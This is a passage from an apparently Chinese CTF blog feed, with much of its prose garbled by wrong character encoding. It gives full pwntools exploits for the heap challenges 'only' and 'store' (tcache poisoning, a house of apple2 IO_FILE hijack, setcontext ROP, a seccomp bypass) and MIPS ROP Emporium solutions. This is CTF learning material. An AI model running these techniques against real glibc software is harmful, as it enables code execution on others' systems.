0x20]</code>å’ŒsetcontextåŠ«æŒrspï¼Œæ‰§è¡ŒROPæˆ–è€…shellcodeã€‚</p><p>åœ¨æ­¤è¿‡ç¨‹ä¸­éœ€è¦çˆ†ç ´ä¸¤æ¬¡åœ°å€ï¼Œæœ‰1&#x2F;256çš„æ¦‚ç‡æ‹¿åˆ°flagï¼Œåœ¨æœ¬åœ°è¿è¡Œæ—¶å¯ä»¥åŠ ä¸Š aslr&#x3D;Falseï¼ŒèŠ‚çœæœ¬åœ°çˆ†ç ´çš„æ—¶é—´ã€‚</p><p>å®Œæ•´exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;only&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-keyword">global</span> p<br><span class="hljs-comment">#p = process(&#x27;./only&#x27;, aslr=False)</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">initial</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>    <span class="hljs-comment">#p.sendlineafter(b&#x27;Size:&#x27;, str(size).encode())</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">increase</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decresae</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    increase(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    decresae()<br>    initial()<br>    decresae()<br>    increase(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\x10\xc0&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p16(<span class="hljs-number">1</span>) + p16(<span class="hljs-number">1</span>)  + p32(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p32(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">7</span>)<br>    increase(<span class="hljs-number">0x70</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>    decresae()<br>    increase(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\xa0\x56&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0x30</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    leak =  u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>    free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    stdout = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    mp = libcbase + <span class="hljs-number">2011848</span><br>    magic_gadget = libcbase + <span class="hljs-number">0x1547a0</span><br>    setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>    pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>    pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c1e1</span><br>    pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>    ret = libcbase + <span class="hljs-number">0x25679</span><br>    mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>    increase(<span class="hljs-number">0x40</span>, p64(free_hook) + p64(stdout) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0xd0</span>, p64(magic_gadget) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0xe0</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br><br><br>    payload = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x140</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>    payload += p64(pop_rdi) + p64(heap_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">7</span>) + p64(<span class="hljs-number">0</span>) + p64(mprotect) + p64(heap_addr + <span class="hljs-number">0x140</span> +<span class="hljs-number">0x70</span>)<br>    payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br>    payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p64(heap_addr + <span class="hljs-number">0x140</span> + <span class="hljs-number">0x28</span>) + p64(ret)<br><br>    increase(<span class="hljs-number">0xe0</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    decresae()<br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br>    <span class="hljs-keyword">try</span> :<br>        p = process(<span class="hljs-string">&#x27;./only&#x27;</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><p>â€‹                                                     </p><p>â€‹                        </p><h3 id="store"><a href="#store" class="headerlink" title="store"></a>store</h3><p>ç¨‹åºåªèƒ½ä½¿ç”¨ä¸¤æ¬¡ç”³è¯·å †å—ï¼Œè™½ç„¶åç»­ä¹Ÿèƒ½ç”³è¯·ï¼Œä½†æ— æ³•å»ä½¿ç”¨ï¼›ç•™äº†ä¸€ä¸ªuafçš„æ¼æ´ï¼Œfreeçš„æ¬¡æ•°ä¹Ÿåªèƒ½æ˜¯4æ¬¡ï¼Œeditå’Œshowè¿™ç§å‡½æ•°å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚å¦‚æœä½¿ç”¨tcacheå»å®ç°ä»»æ„å†™ï¼Œè¿™ä¸¤æ¬¡ç”³è¯·æ˜¯è¿œè¿œä¸å¤Ÿç”¨çš„ã€‚è¿™é‡Œæ˜¯ä½¿ç”¨house of apple2ï¼Œä¸»è¦å°±æ˜¯åˆ©ç”¨ä¸€æ¬¡largebin attackæ”»å‡»å»å®ç°åŠ«æŒIOæ§åˆ¶æµã€‚</p><p>Roderickå¸ˆå‚…çš„æ–‡ç« å·²ç»å¾ˆè¯¦ç»†äº†ï¼š[<a href="https://bbs.pediy.com/thread-273832.htm">åŸåˆ›] House of apple ä¸€ç§æ–°çš„glibcä¸­IOæ”»å‡»æ–¹æ³• (2)-Pwn-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com</a></p><p>â€‹</p><p>å½“ç„¶æ„é€ IO_FILEä¹Ÿéœ€è¦æ³¨æ„<code>_IO_flush_all_lockp</code>å‡½æ•°ä¸­çš„ifåˆ¤æ–­ï¼š</p><img src="/img/6/Screenshot_20230103_111938.png" style="zoom: 67%;" /><p>æ»¡è¶³å‰è€…<code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>ï¼Œæˆ–è€…åè€…&#96;&#96;_IO_vtable_offset (fp) &#x3D;&#x3D; 0&amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base&#96;å³å¯</p><p>â€‹</p><p>è¿›å…¥<code>_IO_wfile_overflow</code>åä¼šæœ‰rdxç›´æ¥èµ‹å€¼ä¸º<code>fp-&gt;_wide_data</code>ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é…åˆsetcontextå‡½æ•°ä½¿ç”¨</p><img src="/img/6/Screenshot_20230103_095137.jpg" style="zoom: 67%;" /><p>â€‹</p><p>é¢˜ç›®ä¸­å­˜åœ¨æ²™ç›’ï¼Œ64ä½å’Œ32çš„é™åˆ¶éƒ½æœ‰</p><img src="/img/6/Screenshot_20230103_103656.jpg" style="zoom: 67%;" /><p>ä½†seccomp-toolså°†32ä½ç³»ç»Ÿè°ƒç”¨å·ä¹Ÿçœ‹æˆ64ä½çš„ï¼Œè¿™å°±å¾ˆè¿·æƒ‘äººã€‚å¯¹æ¯”32ä½çš„ç³»ç»Ÿè¡¨å°±ä¼šå‘ç°opençš„ç³»ç»Ÿè°ƒç”¨åœ¨32ä½ä¸­çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º5ï¼Œè¿™é‡Œå°±å…ˆä½¿ç”¨32ä½çš„openè°ƒç”¨å·å»æ‰“å¼€flagæ–‡ä»¶ï¼Œå†å»ç”¨64ä½çš„è¯»å†™ã€‚ç”±äº32ä½å¯„å­˜å™¨å¤§å°çš„é™åˆ¶ï¼Œç›´æ¥ä½¿ç”¨pwntoolsç”Ÿæˆçš„openç³»ç»Ÿè°ƒç”¨ä¼šå‡ºé”™ï¼Œæ‰€ä»¥å…ˆmmapä¸€æ®µä½åœ°å€å†…å­˜å†å»ä½¿ç”¨ã€‚</p><p>â€‹</p><p>å®Œæ•´exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;store&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./store&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">size, content, remark</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br>    p.sendafter(<span class="hljs-string">b&#x27;Remark:&#x27;</span>, remark)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy1</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">throw</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content, remark</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br>    p.sendafter(<span class="hljs-string">b&#x27;Remark:&#x27;</span>, remark)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>buy(<span class="hljs-number">0x420</span>, <span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>buy(<span class="hljs-number">0x410</span>, <span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>throw(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak -<span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libcbase: &quot;</span> + <span class="hljs-built_in">hex</span>(libcbase))<br><br>buy1(<span class="hljs-number">0x430</span>)<br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;heap_addr: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_addr))<br><br>IO_list_all = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall_ret = libcbase + <span class="hljs-number">0x66229</span><br>ret = libcbase + <span class="hljs-number">0x25679</span><br>magic_gadget = libcbase + <span class="hljs-number">0x154930</span><br>mprotect = libcbase  + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>edit(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(IO_list_all - <span class="hljs-number">0x20</span>), <span class="hljs-string">b&#x27;a&#x27;</span>)<br>throw(<span class="hljs-number">1</span>)<br>buy1(<span class="hljs-number">0x430</span>)<br><br>fake_addr = heap_addr + <span class="hljs-number">0x860</span><br>fake_IO_FILE = <span class="hljs-string">b&#x27;&#x27;</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)                  <span class="hljs-comment">#_lock</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)   <span class="hljs-comment">#_wide_data</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)                              <span class="hljs-comment">#_mode</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps)         <span class="hljs-comment">#vtable</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> <br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)                              <span class="hljs-comment">#_IO_wide_data-&gt;_IO_write_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)                              <span class="hljs-comment">#_IO_wide_data-&gt;_IO_write_prt</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x138</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(setcontext + <span class="hljs-number">61</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x200</span>)<br>fake_IO_FILE += p64(ret)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x1b0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br><br>payload = fake_IO_FILE.ljust(<span class="hljs-number">0x1f0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += flat(<br>    p64(pop_rdi), p64(heap_addr - <span class="hljs-number">0x290</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0x1000</span>),<br>    p64(pop_rdx_r12), p64(<span class="hljs-number">7</span>), p64(<span class="hljs-number">0</span>),<br>    p64(mprotect),<br>    p64(fake_addr + <span class="hljs-number">0x248</span>)<br>)<br>payload += asm(shellcraft.mmap(<span class="hljs-number">0x23000</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>))<br>payload += asm(shellcraft.amd64.read(<span class="hljs-number">0</span>, <span class="hljs-number">0x23000</span>, <span class="hljs-number">0x30</span>), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>payload += asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-number">0x23000</span>, <span class="hljs-number">0</span>))<br>payload += asm(shellcraft.amd64.read(<span class="hljs-number">3</span>, <span class="hljs-number">0x23100</span>, <span class="hljs-number">0x30</span>), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>payload += asm(shellcraft.amd64.write(<span class="hljs-number">1</span>, <span class="hljs-number">0x23100</span>, <span class="hljs-number">0x30</span>), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>edit(<span class="hljs-number">1</span>, payload, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br>p.send(<span class="hljs-string">b&#x27;/flag&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹                                          </p><p>â€‹                                                                          </p><p>å‚è€ƒï¼š<a href="https://blog.wm-team.cn/index.php/archives/34/">å¼ºç½‘æ‹Ÿæ€ 2022 By W&amp;M - W&amp;M Team (wm-team.cn)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Rop Emporinm(MIPS)å‡ é“é¢˜çš„wp</title>
    <link href="/2022/11/11/Rop-Emporinm(MIPS)/"/>
    <url>/2022/11/11/Rop-Emporinm(MIPS)/</url>
    
    <content type="html"><![CDATA[<p>ä¸è·¯ç”±ç¯å¢ƒä¸åŒï¼Œè¿™é‡Œæ‰€ç”¨åˆ°çš„æ˜¯glibcï¼Œæ‰€ä»¥éœ€è¦æå‰ä¸‹è½½å¥½ç›¸åº”çš„åŠ¨æ€é“¾æ¥åº“</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> libc6-mipsel-cross<br></code></pre></td></tr></table></figure><p>â€‹                       </p><p>MIPSåŠ¨æ€åº“ä¸­çš„å¤–éƒ¨ç¬¦å·è°ƒç”¨ï¼Œæ˜¯ä¾èµ–<code>.got</code>æ®µå’Œ<code>.MIPS.stubs</code>æ®µæ¥å…±åŒå®ç°çš„ï¼Œ<code>.MIPS.stubs</code>ç±»ä¼¼äºx86çš„<code>.plt</code>ã€‚</p><h4 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1.ret2win"></a>1.ret2win</h4><p>ç›´æ¥æ‰¾åˆ°å‡½æ•°ret2winåœ°å€å»æ‰§è¡Œ system(â€œ&#x2F;bin&#x2F;cat flag.txtâ€)ï¼Œè¾“å‡ºflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ret2win_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./ret2win_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">36</span> + p32(<span class="hljs-number">0x400a00</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>) <br></code></pre></td></tr></table></figure><h4 id="2-split"><a href="#2-split" class="headerlink" title="2.split"></a>2.split</h4><p>åˆ©ç”¨systemçš„åœ°å€å’Œflag.txtå­—ç¬¦ä¸²çš„åœ°å€ï¼Œè¾“å‡ºflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;split_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./split_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget = <span class="hljs-number">0x400a20</span><br><span class="hljs-comment">#sys_addr = 0x400b70</span><br>sys_addr = <span class="hljs-number">0x4009ec</span><br>cat_flag = <span class="hljs-number">0x411010</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(sys_addr) +p32(cat_flag)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&#x27;</span>)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="3-callme"><a href="#3-callme" class="headerlink" title="3.callme"></a>3.callme</h4><p>è¿è¡Œcallme1ï¼Œcallme2ï¼Œcallme3å‡½æ•°ï¼Œå¹¶ä¼ é€’æ­£ç¡®çš„å‚æ•°ï¼Œåœ¨ifè¯­å¥ä¸­æ‰§è¡Œæ­£ç¡®çš„åˆ†æ”¯ï¼Œæ‰ä¼šå°†flagè¾“å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span 